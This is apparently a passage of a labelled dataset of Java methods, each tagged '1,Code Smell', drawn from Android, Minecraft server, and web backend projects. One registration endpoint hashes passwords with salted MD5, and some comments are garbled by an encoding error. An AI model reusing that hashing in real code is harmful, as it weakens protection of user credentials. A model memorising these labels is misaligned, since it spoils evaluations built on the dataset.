          deoptimizeMethod(c,""test"");
        }
      }
      c=XposedHelpers.findClass(""com.android.server.wm.WindowManagerService"",lpparam.classLoader);
      deoptimizeMethod(c,""relayoutWindow"");
      for (int i=0; i < 20; i++) {
        c=XposedHelpers.findClassIfExists(""com.android.server.wm.RootWindowContainer$$ExternalSyntheticLambda"" + i,lpparam.classLoader);
        if (c != null && BiConsumer.class.isAssignableFrom(c)) {
          deoptimizeMethod(c,""accept"");
        }
      }
    }
 catch (    Throwable t) {
      logE(TAG,this.lpparam.packageName,t);
    }
  }
}",1,Code Smell
"/** 
 * 根据规则表达式和测试字符串进行匹配，如测试字符串和其中一个规则匹配上，则返回 true，反之返回 false。
 * @param patternList 规则列表
 * @param test 测试字符串
 * @return  是否显示
 */
private boolean testPattern(Integer storageId,List<FilterConfig> patternList,String test){
  if (CollUtil.isEmpty(patternList)) {
    if (log.isDebugEnabled()) {
      log.debug(""过滤规则列表为空, 存储源 ID: {}, 测试字符串: {}"",storageId,test);
    }
    return false;
  }
  for (  FilterConfig filterConfig : patternList) {
    String expression=filterConfig.getExpression();
    if (StrUtil.isEmpty(expression)) {
      if (log.isDebugEnabled()) {
        log.debug(""存储源 {} 过滤文件测试表达式: {}, 测试字符串: {}, 表达式为空，跳过该规则校验"",storageId,expression,test);
      }
      continue;
    }
    try {
      boolean match=PatternMatcherUtils.testCompatibilityGlobPattern(expression,test);
      if (log.isDebugEnabled()) {
        log.debug(""存储源 {} 过滤文件测试表达式: {}, 测试字符串: {}, 匹配结果: {}"",storageId,expression,test,match);
      }
      if (match) {
        return true;
      }
    }
 catch (    Exception e) {
      log.error(""存储源 {} 过滤文件测试表达式: {}, 测试字符串: {}, 匹配异常，跳过该规则."",storageId,expression,test,e);
    }
  }
  return false;
}
",1,Code Smell
"@Override protected void doLoadData(int _offset,int count){
  GetSearchResults.Type type;
  if (currentFilter.size() == 1) {
    type=null;
  }
 else {
    type=null;
  }
  if (currentQuery == null) {
    dataLoaded();
    return;
  }
  String maxID=null;
  int offset=_offset;
  currentRequest=new GetSearchResults(currentQuery,type,type == null,maxID,offset,type == null ? 0 : count).setCallback(new SimpleCallback<SearchResults>(this){
    @Override public void onSuccess(    SearchResults result){
      ArrayList<SearchResult> results=new ArrayList<>();
      if (result.accounts != null) {
        for (        Account acc : result.accounts)         results.add(new SearchResult(acc));
      }
      if (result.hashtags != null) {
        for (        Hashtag tag : result.hashtags)         results.add(new SearchResult(tag));
      }
      if (result.statuses != null) {
        Set<String> alreadyLoadedStatuses=data.stream().filter(r -> r.type == SearchResult.Type.STATUS).map(r -> r.status.id).collect(Collectors.toSet());
        for (        Status status : result.statuses) {
          if (!alreadyLoadedStatuses.contains(status.id))           results.add(new SearchResult(status));
        }
      }
      prevDisplayItems=new ArrayList<>(displayItems);
      unfilteredResults=results;
      boolean wasRefreshing=refreshing;
      onDataLoaded(filterSearchResults(results),type != null && !results.isEmpty());
      if (wasRefreshing)       list.scrollToPosition(0);
    }
  }
).exec(accountID);
}",1,Code Smell
"private void saveScrollPosition(){
  for (int k=0; k < mediaPages.length; k++) {
    RecyclerListView listView=mediaPages[k].listView;
    if (listView != null) {
      int messageId=0;
      int offset=0;
      for (int i=0; i < listView.getChildCount(); i++) {
        View child=listView.getChildAt(i);
        if (child instanceof SharedPhotoVideoCell2) {
          SharedPhotoVideoCell2 cell=(SharedPhotoVideoCell2)child;
          messageId=cell.getMessageId();
          offset=cell.getTop();
        }
        if (child instanceof SharedDocumentCell) {
          SharedDocumentCell cell=(SharedDocumentCell)child;
          messageId=cell.getMessage().getId();
          offset=cell.getTop();
        }
        if (child instanceof SharedAudioCell) {
          SharedAudioCell cell=(SharedAudioCell)child;
          messageId=cell.getMessage().getId();
          offset=cell.getTop();
        }
        if (messageId != 0) {
          break;
        }
      }
      if (messageId != 0) {
        int index=-1, position=-1;
        final int type=mediaPages[k].selectedType;
        if (type == TAB_STORIES || type == TAB_ARCHIVED_STORIES) {
          StoriesAdapter adapter=type == TAB_STORIES ? storiesAdapter : archivedStoriesAdapter;
          if (adapter.storiesList != null) {
            for (int i=0; i < adapter.storiesList.messageObjects.size(); ++i) {
              if (messageId == adapter.storiesList.messageObjects.get(i).getId()) {
                index=i;
                break;
              }
            }
          }
          position=index;
        }
 else         if (type >= 0 && type < sharedMediaData.length) {
          for (int i=0; i < sharedMediaData[type].messages.size(); i++) {
            if (messageId == sharedMediaData[type].messages.get(i).getId()) {
              index=i;
              break;
            }
          }
          position=sharedMediaData[type].startOffset + index;
        }
 else {
          continue;
        }
        if (index >= 0) {
          ((LinearLayoutManager)listView.getLayoutManager()).scrollToPositionWithOffset(position,-mediaPages[k].listView.getPaddingTop() + offset);
          if (photoVideoChangeColumnsAnimation) {
            mediaPages[k].animationSupportingLayoutManager.scrollToPositionWithOffset(position,-mediaPages[k].listView.getPaddingTop() + offset);
          }
        }
      }
    }
  }
}",1,Code Smell
"@Override public void modify(ConfigurationImpl configuration){
  if (consulContextProperties != null && consulContextProperties.isEnabled()) {
    boolean consulAvailable=false;
    try {
      consulAvailable=null != Class.forName(""com.ecwid.consul.v1.ConsulClient"");
    }
 catch (    Throwable ignored) {
    }
    if (!consulAvailable) {
      LOGGER.error(""Please import \""connector-consul\"" dependency when enabling consul service registration and discovery.\n"" + ""Add dependency configuration below to pom.xml:\n"" + ""<dependency>\n""+ ""\t<groupId>com.tencent.polaris</groupId>\n""+ ""\t<artifactId>connector-consul</artifactId>\n""+ ""</dependency>"");
      throw new RuntimeException(""Dependency \""connector-consul\"" not found."");
    }
    if (CollectionUtils.isEmpty(configuration.getGlobal().getServerConnectors())) {
      configuration.getGlobal().setServerConnectors(new ArrayList<>());
    }
    if (CollectionUtils.isEmpty(configuration.getGlobal().getServerConnectors()) && null != configuration.getGlobal().getServerConnector()) {
      configuration.getGlobal().getServerConnectors().add(configuration.getGlobal().getServerConnector());
    }
    ServerConnectorConfigImpl serverConnectorConfig=new ServerConnectorConfigImpl();
    serverConnectorConfig.setId(ID);
    serverConnectorConfig.setAddresses(Collections.singletonList(consulContextProperties.getHost() + "":"" + consulContextProperties.getPort()));
    serverConnectorConfig.setProtocol(DefaultPlugins.SERVER_CONNECTOR_CONSUL);
    Map<String,String> metadata=serverConnectorConfig.getMetadata();
    if (StringUtils.isNotBlank(consulContextProperties.getServiceName())) {
      metadata.put(ConsulConstant.MetadataMapKey.SERVICE_NAME_KEY,consulContextProperties.getServiceName());
    }
    if (StringUtils.isNotBlank(consulContextProperties.getInstanceId())) {
      metadata.put(ConsulConstant.MetadataMapKey.INSTANCE_ID_KEY,consulContextProperties.getInstanceId());
    }
    if (StringUtils.isNotBlank(consulContextProperties.getAclToken())) {
      serverConnectorConfig.setToken(consulContextProperties.getAclToken());
    }
    if (consulContextProperties.isPreferIpAddress() && StringUtils.isNotBlank(consulContextProperties.getIpAddress())) {
      metadata.put(ConsulConstant.MetadataMapKey.PREFER_IP_ADDRESS_KEY,String.valueOf(consulContextProperties.isPreferIpAddress()));
      metadata.put(ConsulConstant.MetadataMapKey.IP_ADDRESS_KEY,consulContextProperties.getIpAddress());
    }
    configuration.getGlobal().getServerConnectors().add(serverConnectorConfig);
    DiscoveryConfigImpl discoveryConfig=new DiscoveryConfigImpl();
    discoveryConfig.setServerConnectorId(ID);
    discoveryConfig.setEnable(consulContextProperties.isDiscoveryEnabled());
    configuration.getConsumer().getDiscoveries().add(discoveryConfig);
    RegisterConfigImpl registerConfig=new RegisterConfigImpl();
    registerConfig.setServerConnectorId(ID);
    registerConfig.setEnable(consulContextProperties.isRegister());
    configuration.getProvider().getRegisters().add(registerConfig);
  }
}",1,Code Smell
"public boolean handlePlayerInteraction(Player player,BlockPos localPos,Direction side,InteractionHand interactionHand){
  int indexOfSeat=contraption.getSeats().indexOf(localPos);
  if (indexOfSeat == -1 || AllItems.WRENCH.isIn(player.getItemInHand(interactionHand))) {
    if (contraption.interactors.containsKey(localPos))     return contraption.interactors.get(localPos).handlePlayerInteraction(player,interactionHand,localPos,this);
    return contraption.storage.handlePlayerStorageInteraction(contraption,player,localPos);
  }
  if (player.isPassenger())   return false;
  Entity toDismount=null;
  for (  Entry<UUID,Integer> entry : contraption.getSeatMapping().entrySet()) {
    if (entry.getValue() != indexOfSeat)     continue;
    for (    Entity entity : getPassengers()) {
      if (!entry.getKey().equals(entity.getUUID()))       continue;
      if (entity instanceof Player)       return false;
      toDismount=entity;
    }
  }
  if (toDismount != null && !level().isClientSide) {
    Vec3 transformedVector=getPassengerPosition(toDismount,1);
    toDismount.stopRiding();
    if (transformedVector != null)     toDismount.teleportTo(transformedVector.x,transformedVector.y,transformedVector.z);
  }
  if (level().isClientSide)   return true;
  addSittingPassenger(SeatBlock.getLeashed(level(),player).or(player),indexOfSeat);
  return true;
}",1,Code Smell
"public void start(){
  if (JobExecutor.getAdminBizList() == null) {
    logger.warn("">>>>>>>>>>> web, executor callback config fail, adminAddresses is null."");
    return;
  }
  triggerCallbackThread=new Thread(() -> {
    while (!toStop) {
      try {
        HandleCallbackParam callback=getInstance().callBackQueue.take();
        List<HandleCallbackParam> callbackParamList=new ArrayList<HandleCallbackParam>();
        int drainToNum=getInstance().callBackQueue.drainTo(callbackParamList);
        callbackParamList.add(callback);
        if (callbackParamList.size() > 0) {
          doCallback(callbackParamList);
        }
      }
 catch (      Exception e) {
        if (!toStop) {
          logger.error(e.getMessage(),e);
        }
      }
    }
    try {
      List<HandleCallbackParam> callbackParamList=new ArrayList<HandleCallbackParam>();
      int drainToNum=getInstance().callBackQueue.drainTo(callbackParamList);
      if (callbackParamList != null && callbackParamList.size() > 0) {
        doCallback(callbackParamList);
      }
    }
 catch (    Exception e) {
      if (!toStop) {
        logger.error(e.getMessage(),e);
      }
    }
    logger.info("">>>>>>>>>>> web, executor callback thread destory."");
  }
);
  triggerCallbackThread.setDaemon(true);
  triggerCallbackThread.setName(""web, executor TriggerCallbackThread"");
  triggerCallbackThread.start();
  triggerRetryCallbackThread=new Thread(() -> {
    while (!toStop) {
      try {
        retryFailCallbackFile();
      }
 catch (      Exception e) {
        if (!toStop) {
          logger.error(e.getMessage(),e);
        }
      }
      try {
        TimeUnit.SECONDS.sleep(RegistryConfig.BEAT_TIMEOUT);
      }
 catch (      InterruptedException e) {
        if (!toStop) {
          logger.error(e.getMessage(),e);
        }
      }
    }
    logger.info("">>>>>>>>>>> web, executor retry callback thread destory."");
  }
);
  triggerRetryCallbackThread.setDaemon(true);
  triggerRetryCallbackThread.start();
}",1,Code Smell
"/** 
 * 查找子类，过滤掉接口类
 * @param parent 父类
 * @param annotation 包含的注解
 * @return
 */
public static <T>List<Class<? extends T>> findSubClass(Class<T> parent,Class<? extends Annotation> annotation){
  return findSubClass(parent,annotation,false);
}
/** 
 * 查找子类
 * @param parent 父类
 * @param annotation 需要包含的注解
 * @return 找到的子类列表
 */
public static <T>List<Class<? extends T>> findSubClass(Class<T> parent,Class<? extends Annotation> annotation,boolean acceptInterface){
  if (parent == null) {
    return null;
  }
  List<Class<? extends T>> childrenClasses=new ArrayList<>();
  for (  Class childClass : classes) {
    if (childClass != null && parent.isAssignableFrom(childClass)) {
      if (annotation != null) {
        Annotation targetAnnotation=childClass.getAnnotation(annotation);
        if (targetAnnotation == null) {
          continue;
        }
      }
      if (!acceptInterface) {
        if (childClass.isInterface()) {
          continue;
        }
      }
      childrenClasses.add(childClass);
    }
  }
synchronized (mPatchClasses) {
    for (    List<Class> patchClasses : mPatchClasses.values()) {
      for (      Class childClass : patchClasses) {
        if (childClass != null && parent.isAssignableFrom(childClass)) {
          if (annotation != null) {
            Annotation targetAnnotation=childClass.getAnnotation(annotation);
            if (targetAnnotation == null) {
              continue;
            }
          }
          childrenClasses.add(childClass);
        }
      }
    }
  }
  return childrenClasses;
}
",1,Code Smell
"@Override public ServerPlayer bridge$canPlayerLogin(SocketAddress socketAddress,GameProfile gameProfile,ServerLoginPacketListenerImpl handler){
  UUID uuid=gameProfile.getId();
  List<ServerPlayer> list=Lists.newArrayList();
  for (  ServerPlayer entityplayer : this.players) {
    if (entityplayer.getUUID().equals(uuid)) {
      list.add(entityplayer);
    }
  }
  for (  ServerPlayer entityplayer : list) {
    this.save(entityplayer);
    entityplayer.connection.disconnect(Component.translatable(""multiplayer.disconnect.duplicate_login""));
  }
  ServerPlayer entity=new ServerPlayer(this.server,this.server.getLevel(Level.OVERWORLD),gameProfile,ClientInformation.createDefault());
  Player player=((ServerPlayerEntityBridge)entity).bridge$getBukkitEntity();
  String hostname=handler == null ? """" : ((NetworkManagerBridge)handler.connection).bridge$getHostname();
  InetAddress realAddress=handler == null ? ((InetSocketAddress)socketAddress).getAddress() : ((InetSocketAddress)handler.connection.channel.remoteAddress()).getAddress();
  PlayerLoginEvent event=new PlayerLoginEvent(player,hostname,((InetSocketAddress)socketAddress).getAddress(),realAddress);
  if (this.getBans().isBanned(gameProfile) && !this.getBans().get(gameProfile).hasExpired()) {
    UserBanListEntry gameprofilebanentry=this.bans.get(gameProfile);
    var chatmessage=Component.translatable(""multiplayer.disconnect.banned.reason"",gameprofilebanentry.getReason());
    if (gameprofilebanentry.getExpires() != null) {
      chatmessage.append(Component.translatable(""multiplayer.disconnect.banned.expiration"",BAN_DATE_FORMAT.format(gameprofilebanentry.getExpires())));
    }
    event.disallow(PlayerLoginEvent.Result.KICK_BANNED,CraftChatMessage.fromComponent(chatmessage));
  }
 else   if (!this.isWhiteListed(gameProfile)) {
    event.disallow(PlayerLoginEvent.Result.KICK_WHITELIST,SpigotConfig.whitelistMessage);
  }
 else   if (this.getIpBans().isBanned(socketAddress) && !this.getIpBans().get(socketAddress).hasExpired()) {
    IpBanListEntry ipbanentry=this.ipBans.get(socketAddress);
    var chatmessage=Component.translatable(""multiplayer.disconnect.banned_ip.reason"",ipbanentry.getReason());
    if (ipbanentry.getExpires() != null) {
      chatmessage.append(Component.translatable(""multiplayer.disconnect.banned_ip.expiration"",BAN_DATE_FORMAT.format(ipbanentry.getExpires())));
    }
    event.disallow(PlayerLoginEvent.Result.KICK_BANNED,CraftChatMessage.fromComponent(chatmessage));
  }
 else   if (this.players.size() >= this.maxPlayers && !this.canBypassPlayerLimit(gameProfile)) {
    event.disallow(PlayerLoginEvent.Result.KICK_FULL,SpigotConfig.serverFullMessage);
  }
  this.cserver.getPluginManager().callEvent(event);
  if (event.getResult() != PlayerLoginEvent.Result.ALLOWED) {
    if (handler != null) {
      handler.disconnect(CraftChatMessage.fromStringOrNull(event.getKickMessage()));
    }
    return null;
  }
  return entity;
}
",1,Code Smell
"/** 
 * 鑾峰彇鐢ㄦ埛鐨勬渶澶т娇鐢ㄦ鏁�
 * @param userId
 * @return
 */
public int getMaxChatCnt(Long userId){
  UserAiDO ai=userAiDao.getOrInitAiInfo(userId);
  int strategy=ai.getStrategy();
  int cnt=0;
  if (UserAiStrategyEnum.STAR_JAVA_GUIDE.match(strategy) || UserAiStrategyEnum.STAR_TECH_PAI.match(strategy)) {
    if (Objects.equals(ai.getState(),UserAIStatEnum.FORMAL.getCode())) {
      cnt+=aiConfig.getMaxNum().getStar();
    }
 else     if (Objects.equals(ai.getState(),UserAIStatEnum.TRYING.getCode())) {
      cnt+=aiConfig.getMaxNum().getStarTry();
    }
  }
 else {
    if (UserAiStrategyEnum.WECHAT.match(strategy)) {
      cnt+=aiConfig.getMaxNum().getWechat();
    }
  }
  if (UserAiStrategyEnum.INVITE_USER.match(strategy)) {
    cnt=(int)(cnt + cnt * aiConfig.getMaxNum().getInvited());
  }
  if (ai.getInviteNum() > 0) {
    cnt=cnt + ai.getInviteNum() * ((int)(cnt * aiConfig.getMaxNum().getInviteNum()));
  }
  if (cnt == 0) {
    cnt=aiConfig.getMaxNum().getBasic();
  }
  return cnt;
}",1,Code Smell
"/** 
 * 重新加载刷新数据
 */
private void reloadData(){
  removeAllViews();
  MarginLayoutParams mMarginLayoutParams=new MarginLayoutParams(LayoutParams.WRAP_CONTENT,LayoutParams.WRAP_CONTENT);
  if (mWidth != 0) {
    mMarginLayoutParams.width=mWidth;
  }
  boolean isSetted=false;
  for (int i=0; i < mAdapter.getCount(); i++) {
    final int index=i;
    mCheckedTagArray.put(i,false);
    final View childView=mAdapter.getView(i,null,this);
    addView(childView,mMarginLayoutParams);
    if (mAdapter instanceof OnInitSelectedPosition) {
      boolean isSelected=mAdapter.isSelectedPosition(i);
      if (mTagCheckMode == FLOW_TAG_CHECKED_SINGLE) {
        if (isSelected && !isSetted) {
          mCheckedTagArray.put(i,true);
          childView.setSelected(true);
          isSetted=true;
        }
      }
 else       if (mTagCheckMode == FLOW_TAG_CHECKED_MULTI) {
        if (isSelected) {
          mCheckedTagArray.put(i,true);
          childView.setSelected(true);
        }
      }
 else       if (mTagCheckMode == FLOW_TAG_DISPLAY) {
        mCheckedTagArray.put(i,true);
        childView.setSelected(true);
        childView.setEnabled(false);
      }
    }
    setSelectedIndexs(null);
    setChildViewClickListener(index,childView);
  }
}",1,Code Smell
"/** 
 * 鎵嬫満娉ㄥ唽
 * @param loginByPhone
 * @param bindingResult
 * @return
 * @throws Exception
 */
@RequestMapping(""/register/phone"") @ResponseBody @Transactional(rollbackFor=Exception.class) public MessageResult loginByPhone(@Valid LoginByPhone loginByPhone,BindingResult bindingResult,HttpServletRequest request) throws Exception {
  MessageResult result=BindingResultUtil.validate(bindingResult);
  if (result != null) {
    return result;
  }
  if (""涓浗"".equals(loginByPhone.getCountry())) {
    Assert.isTrue(ValidateUtil.isMobilePhone(loginByPhone.getPhone().trim()),localeMessageSourceService.getMessage(""PHONE_EMPTY_OR_INCORRECT""));
  }
  String ip=request.getHeader(""X-Real-IP"");
  String phone=loginByPhone.getPhone();
  ValueOperations valueOperations=redisTemplate.opsForValue();
  Object code=valueOperations.get(SysConstant.PHONE_REG_CODE_PREFIX + phone);
  isTrue(!memberService.phoneIsExist(phone),localeMessageSourceService.getMessage(""PHONE_ALREADY_EXISTS""));
  isTrue(!memberService.usernameIsExist(loginByPhone.getUsername()),localeMessageSourceService.getMessage(""USERNAME_ALREADY_EXISTS""));
  if (StringUtils.hasText(loginByPhone.getPromotion().trim())) {
    isTrue(memberService.userPromotionCodeIsExist(loginByPhone.getPromotion()),localeMessageSourceService.getMessage(""USER_PROMOTION_CODE_EXISTS""));
  }
  isTrue(gtestCon.watherProof(loginByPhone.getTicket(),loginByPhone.getRandStr(),ip),localeMessageSourceService.getMessage(""VERIFICATION_PICTURE_NOT_CORRECT""));
  notNull(code,localeMessageSourceService.getMessage(""VERIFICATION_CODE_NOT_EXISTS""));
  if (!code.toString().equals(loginByPhone.getCode())) {
    return error(localeMessageSourceService.getMessage(""VERIFICATION_CODE_INCORRECT""));
  }
 else {
    valueOperations.getOperations().delete(SysConstant.PHONE_REG_CODE_PREFIX + phone);
  }
  String loginNo=String.valueOf(idWorkByTwitter.nextId());
  String credentialsSalt=ByteSource.Util.bytes(loginNo).toHex();
  String password=Md5.md5Digest(loginByPhone.getPassword() + credentialsSalt).toLowerCase();
  Member member=new Member();
  if (!StringUtils.isEmpty(loginByPhone.getSuperPartner())) {
    member.setSuperPartner(loginByPhone.getSuperPartner());
    if (!""0"".equals(loginByPhone.getSuperPartner())) {
      member.setStatus(CommonStatus.ILLEGAL);
    }
  }
  member.setMemberLevel(MemberLevelEnum.GENERAL);
  Location location=new Location();
  location.setCountry(loginByPhone.getCountry());
  Country country=new Country();
  country.setZhName(loginByPhone.getCountry());
  member.setCountry(country);
  member.setLocation(location);
  member.setUsername(loginByPhone.getUsername());
  member.setPassword(password);
  member.setMobilePhone(phone);
  member.setSalt(credentialsSalt);
  member.setAvatar(""https://bizzan.oss-cn-hangzhou.aliyuncs.com/defaultavatar.png"");
  Member member1=memberService.save(member);
  if (member1 != null) {
    member1.setPromotionCode(GeneratorUtil.getPromotionCode(member1.getId()));
    memberEvent.onRegisterSuccess(member1,loginByPhone.getPromotion().trim());
    return success(localeMessageSourceService.getMessage(""REGISTRATION_SUCCESS""));
  }
 else {
    return error(localeMessageSourceService.getMessage(""REGISTRATION_FAILED""));
  }
}",1,Code Smell
"private void subscript(PcodeOp pcode,AbsEnv inOutEnv,AbsEnv tmpEnv,Context context,Function callFunc){
  if (callFunc.getParameterCount() != 2) {
    Logging.error(""Wrong parameter for: "" + callFunc);
    return;
  }
  ALoc retALoc=getReturnALoc(callFunc,true);
  if (retALoc == null) {
    return;
  }
  KSet thisKSet=getParamKSet(callFunc,0,inOutEnv);
  if (!thisKSet.isNormal()) {
    return;
  }
  KSet nodeKSet=getParamKSet(callFunc,1,inOutEnv);
  if (!nodeKSet.isNormal()) {
    Logging.warn(""Found multiple node for map. Unimplemented"");
    return;
  }
  AbsVal tmp=nodeKSet.iterator().next();
  ALoc tmpALoc=ALoc.getALoc(tmp.getRegion(),tmp.getValue(),GlobalState.arch.getDefaultPointerSize());
  KSet keyKSet=inOutEnv.get(tmpALoc);
  if (keyKSet.isTop()) {
    inOutEnv.set(retALoc,KSet.getTop(keyKSet.getTaints()),true);
    return;
  }
  KSet resKSet=new KSet(GlobalState.arch.getDefaultPointerSize() * 8);
  for (  AbsVal thisPtrAbsVal : thisKSet) {
    ALoc thisPtrALoc=ALoc.getALoc(thisPtrAbsVal.getRegion(),thisPtrAbsVal.getValue(),GlobalState.arch.getDefaultPointerSize());
    HashMap<AbsVal,AbsVal> thisContainer=getContainer(thisPtrALoc);
    for (    AbsVal key : keyKSet) {
      AbsVal tmpHeap=thisContainer.get(key);
      if (tmpHeap == null) {
        Heap chunk=Heap.getHeap(Utils.getAddress(pcode),context,true);
        thisContainer.put(key,AbsVal.getPtr(chunk));
        tmpHeap=AbsVal.getPtr(chunk);
      }
      resKSet=resKSet.insert(tmpHeap);
    }
  }
  inOutEnv.set(retALoc,resKSet,true);
}",1,Code Smell
"/** 
 * Trains a single dimension.
 * @param state The state object to use.
 * @param numToSelect The number of features to select.
 * @return The sparse vector representing the learned feature weights.
 */
private SparseVector trainSingleDimension(SLMState state,int numToSelect){
  int iter=0;
  while (state.active.size() < numToSelect) {
    state.r=state.y.subtract(state.X.leftMultiply(state.beta));
    logger.info(""At iteration "" + iter + "" Average residual ""+ state.r.sum() / state.numExamples);
    iter++;
    state.corr=state.X.rightMultiply(state.r);
    double max=-1;
    int feature=-1;
    for (int i=0; i < state.numFeatures; ++i) {
      if (!state.activeSet.contains(i)) {
        double absCorr=Math.abs(state.corr.get(i));
        if (absCorr > max) {
          max=absCorr;
          feature=i;
        }
      }
    }
    state.C=max;
    state.active.add(feature);
    state.activeSet.add(feature);
    if (!state.normalize && (feature == state.numFeatures - 1)) {
      logger.info(""Bias selected"");
    }
 else {
      logger.info(""Feature selected: "" + state.featureIDMap.get(feature).getName() + "" (pos=""+ feature+ "")"");
    }
    state.xpi=state.X.selectColumns(state.active);
    if (state.active.size() == (numToSelect - 1)) {
      state.last=true;
    }
    DenseVector betapi=newWeights(state);
    if (betapi == null) {
      logger.log(Level.INFO,""Stopping at feature "" + state.active.size() + "" matrix was no longer invertible."");
      break;
    }
    state.beta=betapi;
  }
  Map<Integer,Double> parameters=new HashMap<>();
  for (int i=0; i < state.numFeatures; ++i) {
    if (state.beta.get(i) != 0) {
      parameters.put(i,state.beta.get(i));
    }
  }
  return SparseVector.createSparseVector(state.numFeatures,parameters);
}",1,Code Smell
"private static IfNode buildGraph(IfStatement stat,boolean stsingle){
  if (stat.iftype == IfStatement.IFTYPE_IFELSE) {
    return null;
  }
  IfNode res=new IfNode(stat);
  Statement ifchild=stat.getIfstat();
  if (ifchild == null) {
    StatEdge edge=stat.getIfEdge();
    res.addChild(new IfNode(edge.getDestination()),1);
  }
 else {
    IfNode ifnode=new IfNode(ifchild);
    res.addChild(ifnode,0);
    if (ifchild.type == Statement.TYPE_IF && ((IfStatement)ifchild).iftype == IfStatement.IFTYPE_IF) {
      IfStatement stat2=(IfStatement)ifchild;
      Statement ifchild2=stat2.getIfstat();
      if (ifchild2 == null) {
        StatEdge edge=stat2.getIfEdge();
        ifnode.addChild(new IfNode(edge.getDestination()),1);
      }
 else {
        ifnode.addChild(new IfNode(ifchild2),0);
      }
    }
    if (!ifchild.getAllSuccessorEdges().isEmpty()) {
      ifnode.addChild(new IfNode(ifchild.getAllSuccessorEdges().get(0).getDestination()),1);
    }
  }
  StatEdge edge=stat.getAllSuccessorEdges().get(0);
  Statement elsechild=edge.getDestination();
  IfNode elsenode=new IfNode(elsechild);
  if (stsingle || edge.getType() != StatEdge.TYPE_REGULAR) {
    res.addChild(elsenode,1);
  }
 else {
    res.addChild(elsenode,0);
    if (elsechild.type == Statement.TYPE_IF && ((IfStatement)elsechild).iftype == IfStatement.IFTYPE_IF) {
      IfStatement stat2=(IfStatement)elsechild;
      Statement ifchild2=stat2.getIfstat();
      if (ifchild2 == null) {
        elsenode.addChild(new IfNode(stat2.getIfEdge().getDestination()),1);
      }
 else {
        elsenode.addChild(new IfNode(ifchild2),0);
      }
    }
    if (!elsechild.getAllSuccessorEdges().isEmpty()) {
      elsenode.addChild(new IfNode(elsechild.getAllSuccessorEdges().get(0).getDestination()),1);
    }
  }
  return res;
}",1,Code Smell
"@Override protected boolean drawChild(Canvas canvas,View child,long drawingTime){
  if (parentFragment != null && parentFragment.getParentLayout() != null && parentFragment.getParentLayout().isActionBarInCrossfade()) {
    return false;
  }
  if (drawBackButton && child == backButtonImageView) {
    return true;
  }
  boolean clip=shouldClipChild(child);
  if (clip) {
    canvas.save();
    canvas.clipRect(0,-getTranslationY() + (occupyStatusBar ? AndroidUtilities.statusBarHeight : 0),getMeasuredWidth(),getMeasuredHeight());
  }
  boolean result=super.drawChild(canvas,child,drawingTime);
  if (supportsHolidayImage && !titleOverlayShown && !LocaleController.isRTL&& (child == titleTextView[0] || child == titleTextView[1] || child == titlesContainer && useContainerForTitles)) {
    Drawable drawable=Theme.getCurrentHolidayDrawable();
    if (drawable != null) {
      SimpleTextView titleView=child == titlesContainer ? titleTextView[0] : (SimpleTextView)child;
      if (titleView != null && titleView.getVisibility() == View.VISIBLE && titleView.getText() instanceof String) {
        TextPaint textPaint=titleView.getTextPaint();
        textPaint.getFontMetricsInt(fontMetricsInt);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
          textPaint.getTextBounds(titleView.getText(),0,1,rect);
        }
 else {
          textPaint.getTextBounds(titleView.getText().toString(),0,1,rect);
        }
        int x=titleView.getTextStartX() + Theme.getCurrentHolidayDrawableXOffset() + (rect.width() - (drawable.getIntrinsicWidth() + Theme.getCurrentHolidayDrawableXOffset())) / 2;
        int y=titleView.getTextStartY() + Theme.getCurrentHolidayDrawableYOffset() + (int)Math.ceil((titleView.getTextHeight() - rect.height()) / 2.0f)+ (int)(dp(8) * (1f - titlesContainer.getScaleY()));
        drawable.setBounds(x,y - drawable.getIntrinsicHeight(),x + drawable.getIntrinsicWidth(),y);
        drawable.setAlpha((int)(255 * titlesContainer.getAlpha() * titleView.getAlpha()));
        drawable.setColorFilter(textPaint.getColor(),PorterDuff.Mode.MULTIPLY);
        drawable.draw(canvas);
        if (overlayTitleAnimationInProgress) {
          child.invalidate();
          invalidate();
        }
      }
    }
    if (NekoConfig.actionBarDecoration.Int() == 3) {
      if (snowflakesEffect != null) {
        snowflakesEffect=null;
      }
      if (fireworksEffect != null) {
        fireworksEffect=null;
      }
    }
 else     if (NekoConfig.actionBarDecoration.Int() == 2) {
      if (fireworksEffect == null) {
        fireworksEffect=new FireworksEffect();
      }
    }
 else     if (NekoConfig.actionBarDecoration.Int() == 1 || Theme.canStartHolidayAnimation()) {
      if (snowflakesEffect == null) {
        snowflakesEffect=new SnowflakesEffect(0);
      }
    }
 else     if (!manualStart) {
      if (snowflakesEffect != null) {
        snowflakesEffect=null;
      }
      if (fireworksEffect != null) {
        fireworksEffect=null;
      }
    }
    if (snowflakesEffect != null) {
      snowflakesEffect.onDraw(this,canvas);
    }
 else     if (fireworksEffect != null) {
      fireworksEffect.onDraw(this,canvas);
    }
  }
  if (clip) {
    canvas.restore();
  }
  return result;
}",1,Code Smell
"@Override public void onSensorChanged(SensorEvent event){
  float range=event.values[0];
  if (this._sensor != null && this._mediaPlayer != null) {
    if (this._mediaPlayer.isPlaying()) {
      if ((double)range > 0.0D) {
        if (this._audioManager.getMode() == AudioManager.MODE_NORMAL) {
          return;
        }
        this._audioManager.setMode(AudioManager.MODE_NORMAL);
        this._audioManager.setSpeakerphoneOn(true);
        final int positions=this._mediaPlayer.getCurrentPosition();
        try {
          this._mediaPlayer.reset();
          this._mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
          this._mediaPlayer.setDataSource(this.context,this._playingUri);
          this._mediaPlayer.setOnPreparedListener(new MediaPlayer.OnPreparedListener(){
            public void onPrepared(            MediaPlayer mp){
              mp.seekTo(positions);
            }
          }
);
          this._mediaPlayer.setOnSeekCompleteListener(new MediaPlayer.OnSeekCompleteListener(){
            public void onSeekComplete(            MediaPlayer mp){
              mp.start();
            }
          }
);
          this._mediaPlayer.prepareAsync();
        }
 catch (        IOException var5) {
          var5.printStackTrace();
        }
        this.setScreenOn();
      }
 else {
        this.setScreenOff();
        if (this._audioManager.getMode() == AudioManager.MODE_IN_COMMUNICATION) {
          return;
        }
        this._audioManager.setMode(AudioManager.MODE_IN_COMMUNICATION);
        this._audioManager.setSpeakerphoneOn(false);
        this.replay();
      }
    }
 else     if ((double)range > 0.0D) {
      if (this._audioManager.getMode() == AudioManager.MODE_NORMAL) {
        return;
      }
      this._audioManager.setMode(AudioManager.MODE_NORMAL);
      this._audioManager.setSpeakerphoneOn(true);
      this.setScreenOn();
    }
  }
}",1,Code Smell
"private Object createListener(){
